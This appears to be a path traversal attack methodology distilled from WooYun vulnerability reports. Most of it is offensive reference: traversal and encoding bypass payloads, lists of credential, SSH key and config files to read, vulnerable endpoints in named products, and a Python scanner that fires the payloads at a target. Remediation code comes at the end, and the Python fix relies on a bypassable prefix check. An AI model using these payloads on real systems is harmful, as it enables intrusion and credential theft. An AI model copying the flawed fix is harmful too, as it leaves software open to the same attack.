# Path Traversal Vulnerability Analysis Methodology

> Distilled from 2,854 cases | Data source: WooYun Vulnerability Database (2010-2016)

**Sections:** [1. Parameter Patterns](#1-vulnerable-parameter-naming-patterns) | [2. Traversal Payloads](#2-directory-traversal-payload-reference) | [3. Sensitive File Targets](#3-sensitive-file-read-targets) | [4. Vulnerable Functions](#4-high-frequency-vulnerable-function-points) | [5. Code Patterns](#5-vulnerable-code-pattern-analysis) | [6. Filter Bypass](#6-filter-bypass-techniques-summary) | [7. Case Library](#7-generic-vulnerability-case-library) | [8. Detection Checklist](#8-vulnerability-discovery-detection-checklist) | [9. Defense](#9-defense-hardening-recommendations) | [10. Case Index](#10-reference-case-index) | [11. Meta-Analysis](#11-meta-analysis-methodology) | [12. Cloud Hosting Case](#12-cloud-hosting-case-analysis-wooyun-2015-0124527)

---

## 1. Vulnerable Parameter Naming Patterns

### 1.1 High-Frequency Vulnerable Parameters (Sorted by Frequency)

| Parameter Name | Occurrences | Typical Scenario |
|----------------|-------------|------------------|
| filename | 63 | File download, attachment retrieval |
| filepath | 30 | File path specification |
| path | 20 | Generic path parameter |
| hdfile | 14 | Specific CMS download parameter |
| inputFile | 9 | Resin/Java services |
| file | 7 | Generic file parameter |
| url | 4 | SSRF/file read composite |
| filePath | 4 | Java camelCase naming |
| FileUrl | 3 | Common in ASP.NET |
| XFileName | 3 | Specific CMS parameter |

### 1.2 Parameter Naming Conventions

```
Generic:    file, path, name, url, src, dir, folder
Download:   download, down, attachment, attach, doc
Read:       read, load, get, fetch, open, input
File:       filename, filepath, fname, fn, resource
Template:   template, tpl, page, include, temp
```

### 1.3 Compound Parameter Combinations

```
# Common dual-parameter combinations
?path=xxx&name=xxx
?filePath=xxx&fileName=xxx
?FileUrl=xxx&FileName=xxx
?file=xxx&showname=xxx
?inputFile=xxx&type=xxx
```

---

## 2. Directory Traversal Payload Reference

### 2.1 Basic Traversal Sequences

```bash
# Standard Linux paths
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../

# Standard Windows paths
..\
..\..\
..\..\..\
```

### 2.2 Encoding Bypass Techniques

#### Single URL Encoding

```
../     -> %2e%2e%2f
..\     -> %2e%2e%5c
/       -> %2f
\       -> %5c
.       -> %2e
```

#### Double URL Encoding

```
../     -> %252e%252e%252f
..\     -> %252e%252e%255c
%2f     -> %252f
```

#### Unicode/UTF-8 Overlong Encoding (GlassFish-specific)

```
..      -> %c0%ae%c0%ae
/       -> %c0%af
\       -> %c1%9c

# Complete payload example (university case)
/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

#### Mixed Encoding

```
..%2f
%2e%2e/
%2e%2e%5c
..%252f
..%c0%af
```

### 2.3 Special Bypass Techniques

#### Null Byte Truncation (%00)

```bash
# PHP < 5.3.4 / Old Java versions
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# E-commerce platform case
/misc/script/?js=../../../../../etc/passwd%00f.js
```

#### Base64 Encoding Bypass

```bash
# Winmail Server case
# ../../../windows/win.ini -> Base64
viewsharenetdisk.php?userid=postmaster&opt=view&filename=Li4vLi4vLi4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5p

# CMS case
pic.php?url=cGljLnBocA==  # Base64 of pic.php
```

#### Path Normalization Bypass

```bash
# Dot bypass
..../
....//
....\/

# Mixed slashes
..\/
../\

# Redundant paths
/./
//
```

---

## 3. Sensitive File Read Targets

### 3.1 Linux System Sensitive Files

```bash
# System accounts (highest occurrence frequency)
/etc/passwd              # User list (9 occurrences)
/etc/shadow              # Password hashes (2 occurrences)
/etc/hosts               # Host mappings (2 occurrences)
/etc/group               # User groups
/etc/sudoers             # sudo configuration

# SSH-related
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/home/[user]/.ssh/authorized_keys
/home/[user]/.ssh/id_rsa

# History files (information goldmine)
/root/.bash_history
/home/[user]/.bash_history
/home/[webuser]/.bash_history

# Process information
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/[n]
/proc/version

# Configuration files
/etc/nginx/nginx.conf
/etc/httpd/conf/httpd.conf
/etc/apache2/apache2.conf
/etc/my.cnf
/etc/mysql/my.cnf
```

### 3.2 Windows System Sensitive Files

```bash
# System files (4 occurrences)
C:\windows\win.ini
C:\boot.ini
C:\windows\system32\config\sam
C:\windows\repair\sam

# IIS configuration
C:\inetpub\wwwroot\web.config
C:\windows\system32\inetsrv\config\applicationHost.config
```

### 3.3 Java Web Sensitive Files

```bash
# Core configuration (6 occurrences)
WEB-INF/web.xml
WEB-INF/classes/
WEB-INF/lib/

# Database configuration
WEB-INF/classes/jdbc.properties
WEB-INF/classes/database.properties
WEB-INF/classes/hibernate.cfg.xml
WEB-INF/classes/applicationContext.xml

# Common payloads
/../WEB-INF/web.xml
/../WEB-INF/web.xml%3f
../../../WEB-INF/web.xml
```

### 3.4 PHP Application Sensitive Files

```bash
# Configuration files (multiple occurrences)
config.php
config.inc.php
db.php
database.php
conn.php
connection.php
common.php
global.php
settings.php
configuration.php

# Framework configuration
config/database.php          # Laravel
application/config/database.php  # CodeIgniter
wp-config.php                # WordPress
config_global.php            # Discuz
config_ucenter.php           # Discuz UCenter
```

### 3.5 ASP.NET Sensitive Files

```bash
# Core configuration (4 occurrences)
web.config
../web.config
../../web.config

# Connection string example
<connectionStrings>
  <add name="xxx" connectionString="Data Source=xxx;Initial Catalog=xxx;User ID=xxx;Password=xxx"/>
</connectionStrings>
```

---

## 4. High-Frequency Vulnerable Function Points

### 4.1 Statistics by Function Category

| Function Type | Occurrences | Typical Endpoint |
|---------------|-------------|------------------|
| File download | 27 | down.php, download.jsp |
| File read | 17 | read.php, get.php |
| Attachment management | 6 | attachment.php |
| Image processing | 5 | image.php, pic.php |
| File upload | 5 | upload.php |
| Log viewing | 4 | log.php, viewlog.jsp |
| Template rendering | 2 | template.php |
| Backup function | 2 | backup.php |

### 4.2 Top 20 Vulnerable Endpoints

```
down.php           (20 occurrences)
download.jsp       (17 occurrences)
download.asp       (13 occurrences)
download.php       (7 occurrences)
download.ashx      (7 occurrences)
viewsharenetdisk.php (6 occurrences)
GetPage.ashx       (6 occurrences)
pic.php            (4 occurrences)
openfile.asp       (4 occurrences)
do_download.jsp    (8 occurrences)
```

### 4.3 Typical Vulnerable URL Patterns

```bash
# PHP
/down.php?filename=../../../etc/passwd
/download.php?file=../config.php
/pic.php?url=[base64-encoded path]

# JSP
/download.jsp?path=../WEB-INF/web.xml
/do_download.jsp?filePath=../../etc/passwd
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPX
/DownLoad.aspx?Accessory=../web.config
/DownFile/OpenFile.aspx?XFileName=../web.config
/download.ashx?file=../../../web.config

# Resin-specific
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

## 5. Vulnerable Code Pattern Analysis

### 5.1 PHP Vulnerable Code Characteristics

```php
// Typical vulnerable code (security vendor case)
<?php
$file_name = $_GET['fileName'];
$file_dir = "../../../log/";
$handler = fopen($file_dir . $file_name, 'r');
// Direct concatenation, no filtering

// CMS Base64 vulnerability
$url = url_base64_decode($_GET["url"]);
echo file_get_contents($url);  // Decoded and read directly

// CRM vulnerability
$path = trim(urldecode($_GET['path']));
$name = substr(trim(urldecode($_GET['name'])), 0, -4);
download($path, $name);  // No filtering, direct download
```

### 5.2 Java Vulnerable Code Characteristics

```java
// Education platform system
String fileName = request.getParameter("fileName");
// Parameter used directly without validation
InputStream is = new FileInputStream(basePath + fileName);

// File download servlet
String filePath = request.getParameter("filePath");
File file = new File(filePath);  // Absolute path used directly
```

### 5.3 ASP.NET Vulnerable Code Characteristics

```csharp
// Local portal system
string requestUriString = Tool.CStr(context.Request["url"]);
WebRequest request = WebRequest.Create(requestUriString);
// file:// protocol not filtered, leading to arbitrary file read
```

---

## 6. Filter Bypass Techniques Summary

### 6.1 Bypass Technique Statistics

| Technique Type | Case Count | Effectiveness |
|---------------|-----------|--------------|
| Direct absolute path access | 16 | High |
| WEB-INF directory access | 6 | High |
| Base64 encoding | 3 | Medium |
| Null byte truncation | 3 | Medium (old versions) |
| file:// protocol | 2 | High |
| Single URL encoding | 1 | Medium |
| UTF-8 overlong encoding | 1 | High (specific servers) |

### 6.2 Bypass Scenarios and Methods

#### Scenario 1: Filtering ../

```bash
# Method 1: URL encoding
%2e%2e%2f
%2e%2e/
..%2f

# Method 2: Double encoding
%252e%252e%252f

# Method 3: Unicode
%c0%ae%c0%ae/

# Method 4: Mixed patterns
....//
..../
..\../
```

#### Scenario 2: File Extension Allowlist

```bash
# Method 1: Null byte truncation (PHP < 5.3.4)
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Method 2: Question mark truncation
../../../WEB-INF/web.xml%3f

# Method 3: Hash truncation
../../../etc/passwd#.jpg
```

#### Scenario 3: Path Allowlist

```bash
# Method: Directory traversal after allowed path
/allowed/path/../../../etc/passwd
/images/../../../etc/passwd
```

#### Scenario 4: Protocol Restrictions

```bash
# file:// protocol read
file:///etc/passwd
file://localhost/etc/passwd
file:///C:/windows/win.ini
```

---

## 7. Generic Vulnerability Case Library

### 7.1 University Systems

```bash
# Education platform system (Impact: major universities)
/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# Courseware management software
/sc8/coursefiledownload?courseId=272&filepath=../../../../../../etc/shadow&filetype=2

# Education CMS
/DownLoad.aspx?Accessory=../web.config
```

### 7.2 Government Systems

```bash
# Multiple government website generic vulnerabilities
/download.jsp?path=../WEB-INF/web.xml
/do_download.jsp?path=/do_download.jsp
/DownFile/OpenFile.aspx?XFileName=../web.config
/load.jsp?path=../WEB-INF&file=web.xml
```

### 7.3 Enterprise Products

```bash
# Security vendor video gateway
/serverLog/downFile.php?fileName=../../../etc/passwd

# Winmail Server 6.0
/viewsharenetdisk.php?userid=postmaster&opt=view&filename=[base64]

# Security vendor scanner product
/task/saveTaskIpList.php?fileName=/etc/passwd

# CRM system
/index.php?m=File&a=filedownload&path=../../../etc/passwd
```

---

## 8. Vulnerability Discovery Detection Checklist

### 8.1 Parameter Fuzzing List

```bash
# Basic tests
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# Windows tests
..\windows\win.ini
..\..\windows\win.ini
..\..\..\windows\win.ini

# Java Web tests
../WEB-INF/web.xml
../../WEB-INF/web.xml
/../WEB-INF/web.xml

# Encoding tests
%2e%2e%2fetc/passwd
..%2fetc/passwd
%2e%2e/etc/passwd
..%252fetc/passwd
%c0%ae%c0%ae/etc/passwd

# Truncation tests
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%23
../../../etc/passwd%3f
```

### 8.2 Function Point Audit Checklist

- [ ] File download function
- [ ] Attachment preview function
- [ ] Image loading function
- [ ] Template rendering function
- [ ] Log viewing function
- [ ] Backup download function
- [ ] File export function
- [ ] Resource loading function
- [ ] Report generation function
- [ ] Static resource serving

### 8.3 Vulnerability Verification Files

```bash
# Linux verification
/etc/passwd       # Always present
/etc/hosts        # Always present
/proc/version     # Kernel version

# Windows verification
C:\windows\win.ini
C:\boot.ini       # XP/2003
C:\windows\system.ini

# Java verification
WEB-INF/web.xml   # Always present

# Application configuration verification
web.config        # ASP.NET
config.php        # PHP
```

---

## 9. Defense Hardening Recommendations

### 9.1 Input Validation

```python
# Path normalization + allowlist validation
import os

def safe_file_access(user_input, base_dir):
    # 1. Normalize path
    full_path = os.path.normpath(os.path.join(base_dir, user_input))

    # 2. Verify within allowed directory
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")

    # 3. Verify file exists and is readable
    if not os.path.isfile(full_path):
        raise FileNotFoundError()

    return full_path
```

### 9.2 Key Defense Measures

1. **Path normalization**: Use `realpath()`/`normpath()` to process input
2. **Directory restriction**: Verify final path is within the allowed base directory
3. **Allowlist validation**: Restrict allowed file types and directories
4. **Privilege minimization**: Run web services as low-privilege users
5. **Sensitive file protection**: Move configuration files outside web directory

---

## 10. Reference Case Index

| Vulnerability ID | Vendor | Key Technique |
|-----------------|--------|---------------|
| wooyun-2015-092186 | A social media platform | curl direct read |
| wooyun-2016-0189746 | Winmail | Base64 encoding |
| wooyun-2016-0214222 | An e-commerce platform | Null byte truncation |
| wooyun-2016-0170101 | A maritime university | UTF-8 overlong encoding |
| wooyun-2015-0130898 | An education technology vendor | WEB-INF read |
| wooyun-2015-0116637 | A CMS product | Base64 + file_get_contents |
| wooyun-2015-0175625 | A security vendor | PHP direct read |
| wooyun-2014-087735 | A portal system | file:// protocol |

---

## 11. Meta-Analysis Methodology

### 11.1 Root Cause of Vulnerability Existence

**Root Cause Analysis**: Path traversal vulnerabilities are fundamentally about ambiguity in "trust boundaries"

```
User input space
    |
[Trust boundary] <-- Failure point
    |
File system space
```

**Core Problem Chain**:
1. **Developer mental model flaw**: "User input = filename" rather than "User input = path instruction"
2. **Semantic gap in string concatenation**: Developer sees `base + filename`; attacker sees `path_traversal + target`
3. **Path resolution layer inconsistency**: Discrepancy between application-layer parsing and operating system parsing

**Typical code anti-pattern**:
```php
# Developer intent: Read user-specified log file
$file = $_GET['file'];
$path = '/var/www/logs/' . $file;

# Attacker perspective: Path constructor
# ?file=../../../../../etc/passwd
# Result: /var/www/logs/../../../../../etc/passwd
#      | after realpath resolution
#      /etc/passwd
```

### 11.2 Multi-Dimensional Vulnerability Discovery Strategy

#### Dimension 1: Parameter Semantic Inference (80/20 Rule)

**High-value parameter semantic characteristics**:
```
Download type: download, down, get, fetch, read, open, view, load
Attachment type: attachment, attach, file, doc, resource
Path type: path, dir, folder, uri, url, src
Configuration type: config, setting, template, include, require
```

**Discovery process**:
```
1. Packet capture/crawler -> Extract all parameter names
2. Semantic matching -> Identify suspicious parameters
3. Context analysis -> Confirm function type
4. Construct test payloads -> Validate vulnerability
```

#### Dimension 2: Function Point Targeted Brute-Force (High-Frequency Vulnerability Points)

**TOP 10 High-Risk Functions** (based on WooYun data):
1. **File download endpoint** (27 occurrences) - down.php, download.jsp
2. **File preview function** (17 occurrences) - view.php, preview.jsp
3. **Image loader** (5 occurrences) - pic.php, image.jsp
4. **Log viewer** (4 occurrences) - log.php, viewlog.jsp
5. **Backup download** (2 occurrences) - backup.php, dump.jsp
6. **Template rendering** (2 occurrences) - template.php, tpl.jsp
7. **Attachment management** (6 occurrences) - attachment.php
8. **Export function** (3 occurrences) - export.php, download_excel.jsp
9. **Resource loading** (4 occurrences) - resource.php, static.jsp
10. **Upload preview** (5 occurrences) - upload.php, preview_upload.jsp

#### Dimension 3: Technology Stack Fingerprinting

**PHP application characteristics**:
```bash
# Key files present
index.php, config.php, common.php
# Test payloads
download.php?file=../../../../../etc/passwd
pic.php?url=config.php  # Base64 encoding test
```

**Java Web characteristics**:
```bash
# Key directories present
WEB-INF/, META-INF/, classes/, lib/
# Test payloads
download.jsp?path=../WEB-INF/web.xml
servlet/file?fileName=/../WEB-INF/web.xml
```

**ASP.NET characteristics**:
```bash
# Key files present
web.config, bin/, App_Code/
# Test payloads
download.ashx?file=../../../web.config
DownLoad.aspx?Accessory=../web.config
```

### 11.3 Test Payload Priority Matrix

| Threat Level | Response Certainty | Test Cost | Priority |
|-------------|-------------------|-----------|----------|
| High | High | Low | **P0** (Test immediately) |
| High | Medium | Low | **P1** (Priority test) |
| Medium | High | Low | **P2** (Standard test) |
| Medium | Medium | Medium | **P3** (Optional test) |
| Low | Low | High | **P4** (Test last) |

**P0 Test Set** (mandatory):
```bash
# Linux basic traversal
../../../../../etc/passwd
..\..\..\..\..\..\etc/passwd

# Windows basic traversal
..\..\..\..\..\..\windows\win.ini

# Java Web basic traversal
../WEB-INF/web.xml
../../WEB-INF/web.xml
```

---

## 12. Cloud Hosting Case Analysis (wooyun-2015-0124527)

### 12.1 Vulnerability Basic Information

```json
{
  "bug_id": "wooyun-2015-0124527",
  "title": "Arbitrary file read vulnerability in a cloud hosting provider's site",
  "vuln_type": "Vulnerability Type: Arbitrary File Traversal/Download",
  "level": "Severity: High",
  "detail": "download.php?file=../../../../../etc/passwd",
  "poc": "file parameter has directory traversal, can read arbitrary system files"
}
```

### 12.2 Vulnerability Technical Analysis

#### Attack Surface Characteristics

**1. Parameter Characteristics Analysis**
```
Parameter name: file
Semantics: Generic file parameter
Risk level: High (7/10)
```

**2. Function Inference**
```
Endpoint: download.php
Function: File download
Expected logic: Read specified file and output
Attack surface: Potential path traversal
```

**3. Payload Construction Logic**
```bash
# Basic traversal depth probing
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../

# Target file location
/etc/passwd  # Linux verification file
C:\windows\win.ini  # Windows verification file
```

#### Vulnerability Code Reconstruction (Estimated)

```php
<?php
// download.php (estimated vulnerable code)
$file = $_GET['file'];  // Parameter obtained directly, no filtering
$filepath = '/var/www/uploads/' . $file;  // String concatenation

header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename=' . basename($file));
readfile($filepath);  // File read directly

// Attack payload:
// download.php?file=../../../../../etc/passwd
// Actual read: /var/www/uploads/../../../../../etc/passwd
//         = /etc/passwd (after path resolution)
?>
```

### 12.3 Impact Assessment

**Root Cause Analysis**: Causal chain from single-point vulnerability to system-wide impact

```
Arbitrary file read
    |
[System sensitive file leak]
    |
|-- /etc/passwd -> User enumeration
|-- /etc/shadow -> Password hash leak
|-- ~/.ssh/id_rsa -> Private key leak -> Direct SSH login
|-- ~/.bash_history -> Operation history -> Intranet information
|-- /var/www/config.php -> Database credentials
|-- WEB-INF/web.xml -> Application logic
+-- Log files -> User data, session tokens
    |
[Complete server compromise]
```

**Actual severity levels**:
- **Information disclosure**: High (system architecture, credentials, user data)
- **Privilege escalation**: High (private key leak -> root privileges)
- **Lateral movement**: High (history records -> intranet topology)
- **Data breach**: High (database credentials -> sensitive data)

### 12.4 Complete Test Payload Collection

#### Linux System Target Files

```bash
# Basic system files
download.php?file=../../../../../etc/passwd
download.php?file=../../../../../etc/shadow
download.php?file=../../../../../etc/hosts
download.php?file=../../../../../etc/group
download.php?file=../../../../../etc/sudoers

# SSH key files
download.php?file=../../../../../root/.ssh/id_rsa
download.php?file=../../../../../root/.ssh/authorized_keys
download.php?file=../../../../../home/*/.ssh/id_rsa
download.php?file=../../../../../home/*/.ssh/authorized_keys

# History commands
download.php?file=../../../../../root/.bash_history
download.php?file=../../../../../home/*/.bash_history

# Web application configuration
download.php?file=../../../../../var/www/html/config.php
download.php?file=../../../../../var/www/html/config.inc.php
download.php?file=../../../../../var/www/html/db.php
download.php?file=../../../../../var/www/html/.htaccess

# Log files
download.php?file=../../../../../var/log/apache2/access.log
download.php?file=../../../../../var/log/apache2/error.log
download.php?file=../../../../../var/log/nginx/access.log
download.php?file=../../../../../var/log/nginx/error.log

# Process information
download.php?file=../../../../../proc/self/environ
download.php?file=../../../../../proc/self/cmdline
```

#### Windows System Target Files

```bash
# System configuration
download.php?file=..\..\..\..\..\..\windows\win.ini
download.php?file=..\..\..\..\..\..\boot.ini
download.php?file=..\..\..\..\..\..\windows\system.ini

# IIS configuration
download.php?file=..\..\..\..\..\..\inetpub\wwwroot\web.config
download.php?file=..\..\..\..\..\..\windows\system32\inetsrv\config\applicationHost.config

# Database files
download.php?file=..\..\..\..\..\..\program files\mysql\my.ini
download.php?file=..\..\..\..\..\..\program files\mysql\data\mysql\user.MYD
```

#### Java Web Application Targets

```bash
# Core configuration
download.php?file=../../WEB-INF/web.xml
download.php?file=../../WEB-INF/classes/jdbc.properties
download.php?file=../../WEB-INF/classes/database.properties
download.php?file=../../WEB-INF/classes/applicationContext.xml

# Class files
download.php?file=../../WEB-INF/classes/
download.php?file=../../WEB-INF/lib/
```

### 12.5 WAF/Filter Bypass Techniques

#### Technique 1: URL Encoding Bypass

```bash
# Single encoding
download.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
download.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Mixed encoding
download.php?file=..%2f..%2f..%2fetc/passwd
download.php?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd
download.php?file=..%252f..%252fetc/passwd
```

#### Technique 2: Unicode/UTF-8 Encoding

```bash
# Overlong UTF-8 encoding (GlassFish/JBoss, etc.)
download.php?file=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

# Unicode encoding
download.php?file=\u002e\u002e/\u002e\u002e/\u002e\u002e/etc/passwd
```

#### Technique 3: Path Obfuscation

```bash
# Redundant slashes
download.php?file=....//....//....//etc/passwd
download.php?file=..\/..\/..\/etc/passwd
download.php?file=../\../\../\etc/passwd

# Redundant paths
download.php?file=./../../etc/passwd
download.php?file=.././../etc/passwd
download.php?file=../%2e%2e/../etc/passwd
```

#### Technique 4: Null Byte Truncation (PHP < 5.3.4)

```bash
# Bypass file extension check
download.php?file=../../../../../etc/passwd%00
download.php?file=../../../../../etc/passwd%00.jpg
download.php?file=../../../../../etc/passwd%00.png
```

#### Technique 5: Absolute Path Jump

```bash
# If relative paths are filtered
download.php?file=/etc/passwd
download.php?file=C:\windows\win.ini

# Protocol bypass
download.php?file=file:///etc/passwd
download.php?file=file://localhost/etc/passwd
```

### 12.6 Automated Detection Script

```python
#!/usr/bin/env python3
# Arbitrary file read vulnerability detector

import requests
from urllib.parse import quote

class FileTraversalScanner:
    def __init__(self, base_url, parameter='file'):
        self.base_url = base_url
        self.parameter = parameter
        self.results = []

    # P0 test set
    def test_p0_payloads(self):
        payloads = [
            # Linux basic traversal
            '../../../../../etc/passwd',
            '..\\..\\..\\..\\..\\..\\etc/passwd',

            # Windows basic traversal
            '..\\..\\..\\..\\..\\..\\windows\\win.ini',

            # Java Web traversal
            '../WEB-INF/web.xml',
            '../../WEB-INF/web.xml',
        ]

        return self._test_payloads(payloads)

    # Encoding bypass tests
    def test_encoding_bypass(self):
        payloads = [
            # Single URL encoding
            quote('../../../../../etc/passwd', safe=''),
            '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '..%2f..%2f..%2fetc/passwd',

            # Double encoding
            '%252e%252e%252f%252e%252e%252fetc/passwd',

            # Unicode encoding
            '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',

            # Null byte truncation
            '../../../../../etc/passwd%00',
            '../../../../../etc/passwd%00.jpg',
        ]

        return self._test_payloads(payloads)

    # Sensitive file detection
    def test_sensitive_files(self):
        files = [
            '/etc/passwd',
            '/etc/shadow',
            '/root/.ssh/id_rsa',
            '/root/.bash_history',
            '/var/www/html/config.php',
            '/WEB-INF/web.xml',
            'C:\\windows\\win.ini',
            'C:\\inetpub\\wwwroot\\web.config',
        ]

        payloads = [f'../../../../../..{f}' for f in files]
        return self._test_payloads(payloads)

    def _test_payloads(self, payloads):
        results = []
        for payload in payloads:
            url = f'{self.base_url}?{self.parameter}={payload}'
            try:
                response = requests.get(url, timeout=5)
                if self._is_vulnerable(response):
                    results.append({
                        'payload': payload,
                        'url': url,
                        'status': response.status_code,
                        'evidence': self._extract_evidence(response)
                    })
            except Exception as e:
                continue
        return results

    def _is_vulnerable(self, response):
        # Detect Linux passwd file
        if 'root:' in response.text and '/bin/bash' in response.text:
            return True
        # Detect Windows win.ini
        if '[extensions]' in response.text or '[fonts]' in response.text:
            return True
        # Detect Java web.xml
        if '<web-app' in response.text and 'servlet' in response.text:
            return True
        return False

    def _extract_evidence(self, response):
        lines = response.text.split('\n')[:3]
        return '\n'.join(lines)

# Usage example
if __name__ == '__main__':
    scanner = FileTraversalScanner('https://example.com/[redacted]')
    print('[*] Testing P0 payloads...')
    results = scanner.test_p0_payloads()
    for r in results:
        print(f'[+] Vulnerable: {r["url"]}')
        print(f'    Evidence:\n{r["evidence"]}\n')
```

### 12.7 Remediation

#### Incorrect Examples (Still Vulnerable)

```php
// Incorrect: Partial filtering, bypassable
$file = str_replace('../', '', $_GET['file']);
// Bypass: ....// or ..\ or %2e%2e%2f

// Incorrect: Only checks beginning
if (strpos($file, '../') === 0) { die(); }
// Bypass: ./../ or %2e%2e/

// Incorrect: Incomplete regex
if (preg_match('/\.\.\//', $file)) { die(); }
// Bypass: ..\ or %2e%2e%2f
```

#### Correct Remediation

```php
// Correct: Path normalization + allowlist validation
<?php
function safe_download($user_input, $base_dir = '/var/www/uploads/') {
    // 1. Path normalization (resolve all ../ and symlinks)
    $full_path = realpath($base_dir . $user_input);

    // 2. Verify path is within allowed directory
    if ($full_path === false || strpos($full_path, $base_dir) !== 0) {
        http_response_code(403);
        die('Access denied');
    }

    // 3. Verify file exists
    if (!file_exists($full_path)) {
        http_response_code(404);
        die('File not found');
    }

    // 4. Validate file type (optional allowlist)
    $allowed_exts = ['jpg', 'png', 'pdf', 'doc', 'docx'];
    $ext = strtolower(pathinfo($full_path, PATHINFO_EXTENSION));
    if (!in_array($ext, $allowed_exts)) {
        http_response_code(403);
        die('File type not allowed');
    }

    // 5. Safe download
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=' . basename($full_path));
    readfile($full_path);
}

// Usage
safe_download($_GET['file']);
?>
```

```java
// Java version remediation
import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;

public class SecureDownload {
    private static final String BASE_DIR = "/var/www/uploads/";

    public static void safeDownload(String userInput) throws Exception {
        // 1. Normalize path
        Path basePath = Paths.get(BASE_DIR).toAbsolutePath().normalize();
        Path fullPath = basePath.resolve(userInput).toAbsolutePath().normalize();

        // 2. Verify within base directory
        if (!fullPath.startsWith(basePath)) {
            throw new SecurityException("Path traversal detected");
        }

        // 3. Verify file exists and is readable
        File file = fullPath.toFile();
        if (!file.exists() || !file.isFile() || !file.canRead()) {
            throw new FileNotFoundException("File not accessible");
        }

        // 4. Download file
        // ... download logic
    }
}
```

```csharp
// ASP.NET version remediation
using System;
using System.IO;
using System.Linq;

public class SecureDownloadHandler : IHttpHandler {
    private const string BaseDir = @"C:\inetpub\wwwroot\uploads\";

    public void ProcessRequest(HttpContext context) {
        string userInput = context.Request["file"];

        // 1. Path normalization
        string basePath = Path.GetFullPath(BaseDir);
        string fullPath = Path.GetFullPath(Path.Combine(BaseDir, userInput));

        // 2. Verify within base directory
        if (!fullPath.StartsWith(basePath, StringComparison.OrdinalIgnoreCase)) {
            throw new SecurityException("Path traversal detected");
        }

        // 3. Verify file exists
        if (!File.Exists(fullPath)) {
            context.Response.StatusCode = 404;
            return;
        }

        // 4. Allowlist file types
        string ext = Path.GetExtension(fullPath).ToLower();
        string[] allowedExts = { ".jpg", ".png", ".pdf" };
        if (!allowedExts.Contains(ext)) {
            context.Response.StatusCode = 403;
            return;
        }

        // 5. Safe download
        context.Response.ContentType = "application/octet-stream";
        context.Response.TransmitFile(fullPath);
    }
}
```

---

*This document was generated from analysis of real cases in the WooYun vulnerability database, intended for security research and defensive reference only.*
